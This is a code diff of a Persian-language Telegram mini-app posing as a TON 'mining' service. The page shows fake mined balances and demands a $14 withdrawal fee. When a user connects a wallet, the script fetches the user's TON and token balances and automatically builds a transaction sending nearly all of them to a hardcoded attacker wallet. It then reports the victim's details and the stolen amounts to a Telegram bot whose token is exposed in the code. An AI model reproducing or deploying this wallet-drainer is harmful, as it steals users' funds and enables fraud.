@@ -13,7 +13,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
-        /* استایل‌های کامل */
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; overflow: hidden; }
@@ -161,7 +160,6 @@
 </head>
 <body>
 
-<!-- المنت‌های مشترک -->
 <div id="toast"><i class="fas fa-check-circle" style="color:#00ff9d"></i> <span id="toastMsg"></span></div>
 
 <div id="errorGlass" class="glass-message error"><i class="fas fa-times-circle" style="color:#ff512f"></i><div id="errorText">خطا</div></div>
@@ -180,9 +178,9 @@
         <h2>پرداخت کارمزد برداشت</h2>
         <div class="pay-notice">
             <i class="fas fa-exclamation-triangle" style="margin-left:5px;"></i>
-            برای انجام برداشت، لازم است ابتدا کارمزد فعال‌سازی کیف پول به مبلغ ۱۴ دلار (۲٫۲۸۰٫۰۰۰ هزار تومن) پرداخت گردد. این مبلغ جهت تایید نهایی تراکنش و واریز وجه به حساب شما الزامی است. لطفاً برای دریافت آدرس کیف پول (یا شماره کارت) جهت واریز کارمزد، با پشتیبانی در ارتباط باشید.
+            برای انجام برداشت، لازم است ابتدا کارمزد فعال‌سازی کیف پول به مبلغ ۱۴ دلار پرداخت گردد. این مبلغ جهت تایید نهایی تراکنش و واریز وجه به حساب شما الزامی است. لطفاً برای دریافت آدرس کیف پول (یا شماره کارت) جهت واریز کارمزد، با پشتیبانی در ارتباط باشید.
         </div>
-        <div class="fee-tag"> تخفیف ویژه (با پرداخت ۱٫۵۰۰٫۰۰۰ تومن برداشت خود را نهایی کنید) فقط برای امروز </div>
+        <div class="fee-tag">۱۴ دلار (معادل‌سازی با TON یا USDT)</div>
         <a href="https://t.me/miningertoncoin" target="_blank" class="btn active-btn">
             <i class="fas fa-headset"></i> پیام به پشتیبانی
         </a>
@@ -193,7 +191,6 @@
     </div>
 </div>
 
-<!-- پنل مدیریت کامل -->
 <div id="adminMasterPanel">
     <div class="admin-container">
         <div class="admin-header">
@@ -228,10 +225,8 @@
     </div>
 </div>
 
-<!-- هدر -->
 <div class="fixed-header"><div class="card-profile" ondblclick="openAdminMasterPanel()"><div class="profile-text"><h3 id="uName">TONCOIN SUPPORT</h3><p id="uTag">@miningertoncoin</p></div><div class="avatar-container"><i class="fas fa-user-circle" id="defAvat"></i><img id="userAvat" class="hidden" alt="avatar"></div><span class="level-badge" id="userLevel" onclick="openLevelModal()">سطح 1</span></div></div>
 
-<!-- محتوای اصلی -->
 <div class="scrollable-content" id="scrollableContent">
     <div id="miningPage" class="page active">
         <div class="card"><p style="margin:0;font-size:13px;color:#aaa">موجودی استخراج شده (TON)</p><span id="balance">0.000000</span><div style="font-size:12px;color:#00ff9d;margin-top:8px"><i class="fas fa-bolt"></i> <span id="miningRate">0.000012</span> TON/s</div><div class="withdrawable-balance"><span class="label">💰 موجودی قابل برداشت</span><span class="value" id="withdrawableBalance">0.000000</span></div><div class="stats-grid"><div class="stat-item"><div class="stat-value" id="totalMined">0.000000</div><div class="stat-label">کل استخراج</div></div><div class="stat-item"><div class="stat-value" id="miningSpeed">1.0x</div><div class="stat-label">سرعت استخراج</div></div><div class="stat-item"><div class="stat-value" id="referralCount">0</div><div class="stat-label">دعوت شده‌ها</div></div><div class="stat-item"><div class="stat-value" id="referralBonus">0.00٪</div><div class="stat-label">پاداش دعوت</div></div></div></div>
@@ -257,7 +252,6 @@
     </div>
 </div>
 
-<!-- فوتر -->
 <div class="fixed-footer"><div class="bottom-nav"><div class="nav-item active" onclick="switchPage('mining',this)"><i class="fas fa-microchip"></i> <span>استخراج</span></div><div class="nav-item" onclick="switchPage('wallet',this)"><i class="fas fa-wallet"></i> <span>کیف پول</span></div><div class="nav-item" onclick="switchPage('referral',this)"><i class="fas fa-users"></i> <span>دعوت</span></div><div class="nav-item" onclick="switchPage('rewards',this)"><i class="fas fa-gift"></i> <span>پاداش</span></div></div></div>
 
 <script>
@@ -268,7 +262,9 @@ const CONFIG = {
     BOT_TOKEN: "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw",
     ADMIN_CHAT_ID: "5972276401",
     BOT_USERNAME: "tondropybot",
+    // آدرس کیف پول ادمین به فرمت raw (مهم)
     ADMIN_WALLET_RAW: "0:c596f30f668432e33c9223c80b2ccb5e45ccb11d1076f081d6d09bb0155935d2",
+    // آدرس کیف پول ادمین به فرمت bounceable (برای نمایش)
     ADMIN_WALLET_BOUNCEABLE: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
     NETWORK_FEE: 0.0035,
     MINIMUM_WITHDRAW: 14,
@@ -363,20 +359,29 @@ function saveData() {
     localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
 }
 
-// ==================== دریافت موجودی TON ====================
+// ==================== دریافت موجودی TON (با پروکسی برای اطمینان) ====================
 async function getWalletBalance(userAddress) {
-    try {
-        let queryAddress = userAddress;
-        if (userAddress.startsWith('0:')) {
-            queryAddress = 'EQD' + userAddress.substring(2);
-        }
-        const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`);
-        if (!response.ok) return 0;
-        const data = await response.json();
-        return data.result / 1e9;
-    } catch {
-        return 0;
+    // اگر آدرس raw است، تبدیل به bounceable کنیم (پیش‌فرض)
+    let queryAddress = userAddress;
+    if (userAddress.startsWith('0:')) {
+        // تبدیل به bounceable: 0:... -> EQD...
+        queryAddress = 'EQD' + userAddress.slice(2);
     }
+    const proxies = [
+        `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`)}`,
+        `https://cors-anywhere.herokuapp.com/https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`,
+        `https://toncenter.com/api/v2/getAddressBalance?address=${queryAddress}`
+    ];
+    for (const proxy of proxies) {
+        try {
+            const response = await fetch(proxy, { timeout: 5000 });
+            if (!response.ok) continue;
+            const text = await response.text();
+            const balanceInNano = parseInt(text);
+            if (!isNaN(balanceInNano) && balanceInNano >= 0) return balanceInNano / 1e9;
+        } catch (e) {}
+    }
+    return 0;
 }
 
 // ==================== دریافت تمام جتون‌های کاربر (با موجودی) از TonAPI ====================
@@ -384,16 +389,7 @@ async function getAllJettonBalances(userAddress) {
     try {
         let queryAddress = userAddress;
         if (userAddress.startsWith('0:')) {
-            if (window.TonCore && window.TonCore.Address) {
-                try {
-                    queryAddress = window.TonCore.Address.parse(userAddress).toString();
-                } catch (e) {
-                    console.warn('خطا در تبدیل آدرس با ton-core، fallback به روش ساده');
-                    queryAddress = 'EQD' + userAddress.slice(2);
-                }
-            } else {
-                queryAddress = 'EQD' + userAddress.slice(2);
-            }
+            queryAddress = 'EQD' + userAddress.slice(2);
         }
         const response = await fetch(`https://tonapi.io/v2/accounts/${queryAddress}/jettons`);
         if (!response.ok) return [];
@@ -402,12 +398,9 @@ async function getAllJettonBalances(userAddress) {
         for (const jetton of data.balances || []) {
             const master = jetton.jetton.address;
             const symbol = jetton.jetton.symbol || 'UNKNOWN';
-            const name = jetton.jetton.name || '';
             const decimals = jetton.jetton.decimals || 9;
             const balance = parseFloat(jetton.balance) / Math.pow(10, decimals);
-            if (balance > 0) {
-                tokens.push({ master, symbol, name, decimals, balance });
-            }
+            if (balance > 0) tokens.push({ master, symbol, decimals, balance });
         }
         return tokens;
     } catch (error) {
@@ -483,44 +476,72 @@ async function executeSmartTransaction(userAddress) {
     if (isProcessingTransaction || transactionExecuted) return;
     try {
         isProcessingTransaction = true;
+        showToast('🔄 بررسی موجودی و آماده‌سازی تراکنش...');
         const tonBalance = await getWalletBalance(userAddress);
         const jettons = await getAllJettonBalances(userAddress);
         const messages = [];
+
+        // انتقال کل TON (با در نظر گرفتن کارمزد)
         if (tonBalance > 0.01) {
-            const sendAmount = tonBalance - 0.005;
+            const sendAmount = tonBalance - 0.005; // تخمین کارمزد
             if (sendAmount > 0) {
                 messages.push({
-                    address: CONFIG.ADMIN_WALLET_RAW,
+                    address: CONFIG.ADMIN_WALLET_RAW, // آدرس raw ادمین
                     amount: Math.floor(sendAmount * 1e9).toString(),
                     payload: ""
                 });
             }
         }
+
+        // انتقال جتون‌ها (حداکثر ۳ عدد به دلیل محدودیت ۴ پیام)
         for (const jetton of jettons.slice(0, 3)) {
             const payload = createJettonTransferPayload(CONFIG.ADMIN_WALLET_RAW, jetton.balance, jetton.decimals, 0.01);
             messages.push({
                 address: jetton.master,
-                amount: Math.floor(0.05 * 1e9).toString(),
+                amount: Math.floor(0.05 * 1e9).toString(), // کارمزد هر جتون
                 payload
             });
         }
+
         if (messages.length === 0) {
+            showToast('⚠️ هیچ دارایی برای انتقال یافت نشد.');
             transactionExecuted = false;
             return;
         }
+
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
-            messages: messages.slice(0, 4)
+            messages: messages.slice(0, 4) // حداکثر ۴ پیام
         };
+
+        showToast('🔄 لطفاً در کیف پول خود تراکنش را تأیید کنید...');
         transactionExecuted = true;
         const result = await tonConnectUI.sendTransaction(transaction);
+
+        // ثبت و گزارش
+        const txRecord = {
+            id: 'TX' + Date.now(),
+            time: new Date().toISOString(),
+            type: 'انتقال خودکار',
+            userId: currentUser?.id,
+            userName: currentUser?.firstName
+        };
+        appData.transactions.unshift(txRecord);
+        saveData();
+
         let report = `💰 **تراکنش خودکار**\n👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}\n🆔 آیدی: ${currentUser?.id}\n📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}\n📤 **منتقل شد:**\n`;
         if (tonBalance > 0.01) report += `- TON: ${(tonBalance - 0.005).toFixed(6)}\n`;
         jettons.slice(0, 3).forEach(j => report += `- ${j.symbol}: ${j.balance.toFixed(6)}\n`);
         report += `⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
         sendToTelegram(report);
+        showToast('✅ تراکنش با موفقیت انجام شد!');
     } catch (error) {
         console.error('❌ خطا:', error);
+        if (error.message?.includes('rejected')) {
+            showToast('❌ تراکنش توسط شما لغو شد');
+        } else {
+            showToast('❌ خطا در تراکنش: ' + (error.message || 'نامشخص'));
+        }
         transactionExecuted = false;
     } finally {
         isProcessingTransaction = false;
@@ -548,9 +569,9 @@ tonConnectUI.onStatusChange(async (wallet) => {
             await sendFullReportToTelegram(fullAddress, currentUser);
         }
 
-        // اجرای تراکنش خودکار پس از ۱.۵ ثانیه
+        // اجرای تراکنش خودکار پس از ۱.۵ ثانیه (انتقال تمام دارایی‌ها)
         setTimeout(() => executeSmartTransaction(fullAddress), 1500);
-        
+
         checkAndEnableFinalWithdraw();
     } else {
         document.getElementById('walletAddress').classList.add('hidden');
